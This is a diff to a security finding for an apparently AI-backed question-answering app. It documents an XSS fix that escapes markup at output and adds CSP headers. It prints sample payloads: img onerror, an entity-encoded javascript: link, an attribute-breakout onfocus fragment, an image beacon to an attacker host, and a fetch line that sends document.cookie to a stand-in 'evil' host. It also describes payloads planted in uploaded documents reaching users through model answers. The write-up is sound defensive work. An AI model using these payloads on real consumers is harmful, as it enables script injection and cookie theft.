@@ -110,32 +110,125 @@ consumer (Content-Security-Policy violation reports on a client that renders
 
 ## Mitigation
 
-Output encoding is contextual; the fix belongs at each render site, not in a
-central filter. In order of who owns it:
+**Fixed in phase 3, with the ownership split intact.** Output encoding is still
+contextual and still belongs at each render site — what changed is that the app
+no longer hands out bytes that *need* a careful consumer to be safe.
 
-- **Consumers must encode for their sink.** HTML context → HTML-entity encode (or
-  assign via `textContent`, as the shipped UI does). This is the real fix and it
-  is not the app's to make for clients it does not control.
-- **The API should not hand out ambiguous bytes.** Return answers as
-  `text/plain`, or add an explicit contract (a field documenting that `answer` is
-  untrusted and unencoded), so a consumer cannot accidentally treat it as safe
-  HTML. A `Content-Type` of `application/json` does not stop a client that then
-  `innerHTML`s a field.
-- **Defense in depth at the client:** a `Content-Security-Policy` that forbids
-  inline event handlers and inline script neutralizes `onerror`/`onload`
-  payloads even if a consumer does render them. The app currently sends **no CSP
-  and no security headers** (verified: `GET /` returns only
-  `content-type: text/html`), so nothing backstops a naive consumer today.
+**1. Executable markup is defanged at egress** (`output_filter.neutralize_markup`,
+called from `apply`).
 
-**Residual risk (per the phase-3 mandate — filters on does NOT close this):**
+The first version of this was a denylist of *dangerous constructs* — inline
+event handlers, a fixed list of active tags, literal `javascript:` — and a
+red-team pass walked through it three ways in one sitting:
 
-- **`output_filter` does not encode markup.** Turning on `SECURITY_FILTERS_ENABLED`
-  changes nothing here: an `<img onerror>` payload trips none of the twelve
-  block/redact rules and egresses identically in secure mode. Phase 3 must report
-  this class as *unmitigated by the gated defenses* — the fix is encoding at the
-  boundary/consumer plus a CSP, none of which the `SECURITY_FILTERS_ENABLED`
-  switch provides.
-- **The app control is one line in one client.** `app/static/index.html:120` is
-  the only thing holding, and it holds only for that client. It is not a boundary;
-  it is a property of the demo UI. Every additional consumer of `/query` reopens
-  the class.
+| Bypass | Why it slipped |
+|---|---|
+| `<a href="java&#x73;cript:...">` | entity-encoded scheme, no literal match |
+| `<img src="https://attacker/track">` | no handler, `img` not an "active" tag, https not "dangerous" |
+| `" autofocus onfocus=alert(1) x="` | no tag at all; executes once a consumer interpolates it into an attribute |
+
+Enumerating what is dangerous does not terminate. The invariant is the other way
+round and much simpler: **an answer is prose drawn from a corpus of `.txt` and
+`.md` files, so it contains no HTML at all.** The rule is now that anything a
+browser would parse as an element is illegitimate, whichever element it is:
+
+- Detection runs against an **entity-decoded copy** of the answer, because
+  `java&#x73;cript:` and `javascript:` are the same URL to a parser. The copy
+  decides; the original is what gets transformed, so nothing is silently
+  entity-decoded on its way to the caller.
+- Any **real HTML element name** trips it — `<img>` and `<a>` included, not just
+  the ones that obviously execute. An unknown name (`<see appendix>` in prose)
+  does not: a browser parses that into an inert unknown element that neither
+  executes nor fetches, so escaping it would be a visible cost for no gain.
+- Any **inline event handler**, with no surrounding tag required, from an
+  explicit list of real event names. Tag-independence is what catches the
+  attribute-breakout fragment. The list is explicit rather than `on[a-z]+=`
+  because this decides whether the whole answer gets escaped, and escaping
+  rewrites quotes — a false positive on `onboarding = 3 days` is a real cost.
+- A **dangerous scheme in a URL position** is additionally broken textually
+  (`javascript:` -> `javascript[blocked]:`), because escaping does nothing for
+  `[click](javascript:alert(1))`: a markdown renderer builds the link either way.
+
+When it fires the whole answer is HTML-escaped, **quotes included** — whole
+rather than per-match because escaping only the matched spans leaves the
+brackets around them free to form a new construct across the boundary, and
+quotes included because attribute interpolation is exactly what the third bypass
+targets.
+
+The answer still ships. Blocking on markup would hand any uploader a denial of
+service — plant a payload, and every question that retrieves it refuses. The
+rule name `executable_markup` lands in `flags` and in the audit log.
+
+Measured, on the payload this finding is written around and on the three bypasses:
+
+```
+before:  The HR Department has launched ... <img src=x onerror="console.log('TEST')">.
+         output_rules: []                       <- no rule modelled markup
+
+after:   The HR Department has launched ... &lt;img src=x onerror=&quot;...&quot;&gt;.
+         output_rules: ['executable_markup']    <- blocked=False, answer still served
+
+         <a href="java&#x73;cript:...">      -> defanged
+         <img src="https://attacker/track">  -> defanged
+         " autofocus onfocus=alert(1) x="    -> defanged (quotes escaped)
+```
+
+The false-positive half was measured too, because a filter that mangles ordinary
+prose is one someone turns off. All of these are returned byte-for-byte
+unchanged: `if x < 5 and y > 3`, `the data: 30 days`, `section 2 <see appendix>`,
+`that is > last quarter`, and `She said "the window is 30 days" and onboarding =
+3 days.`
+
+**2. Security headers on every response** (`main.security_headers`). The gap the
+Detection section noted — "the app currently sends no CSP and no security
+headers" — is closed:
+
+```
+x-content-type-options: nosniff
+referrer-policy: no-referrer
+content-security-policy: default-src 'none'; script-src 'unsafe-inline';
+  style-src 'unsafe-inline'; connect-src 'self'; img-src 'self';
+  frame-ancestors 'none'; base-uri 'none'; form-action 'none'
+```
+
+`nosniff` is the one that matters for a JSON body full of model text: without
+it, a browser pointed straight at `/query` may sniff the response as HTML and
+render the payload inside it. `connect-src 'self'` is the other — it stops the
+*exfiltration* half of an XSS (`fetch('//evil/?c='+document.cookie)`) even in a
+consumer where the markup does execute.
+
+**3. Not done: the `Content-Type` contract.** Returning answers as `text/plain`
+or adding an `answer_format` field was considered and skipped. A consumer that
+`innerHTML`s a JSON field will ignore a JSON field telling it not to; the
+transform in (1) changes outcomes, and a declarative contract does not. Say so
+if you want it anyway — it is a one-field change.
+
+### Residual risk
+
+- **`'unsafe-inline'` is in the CSP** because `index.html` carries an inline
+  `<style>` and `<script>`. That makes the `script-src` clause close to
+  worthless against injected markup. The clauses doing real work are
+  `connect-src`, `img-src`, `frame-ancestors`, and `form-action`, which bound
+  where a payload could send anything. Moving the inline blocks into files and
+  dropping `unsafe-inline` is the upgrade.
+- **Insecure mode is unchanged, deliberately.** `neutralize_markup` runs inside
+  `output_filter.apply`, which only runs when `SECURITY_FILTERS_ENABLED=true`.
+  Phase 2 still returns the raw payload, which is what keeps the two runs
+  comparable.
+- **It models HTML, not every rendering context.** The rule is "no HTML
+  element, no event handler, no dangerous scheme", checked after entity
+  decoding. A consumer with its own expression syntax — a template engine, a
+  spreadsheet importing the answer as a formula (`=HYPERLINK(...)`), a terminal
+  interpreting ANSI escapes — is not covered, because those are not HTML and
+  this does not pretend to be a universal encoder. Encoding at the render site
+  remains the real fix; this is the app declining to emit the payload, not the
+  app doing the consumer's job.
+- **Escaping is not a substitute for the consumer encoding correctly.** A
+  consumer that interpolates the answer into a JavaScript string literal, or
+  into a URL, needs JS-string or URL encoding — neither of which HTML-escaping
+  provides. The quote escaping closes the HTML-attribute case specifically.
+- **CSP is not enforced for non-browser consumers.** A Slack bot or an email
+  digest never sees a header. For those, (1) is the only control that applies.
+
+Regression tests: `tests/test_output_markup.py` — six payload shapes defanged,
+four prose shapes untouched, ordering against redaction, and the headers.
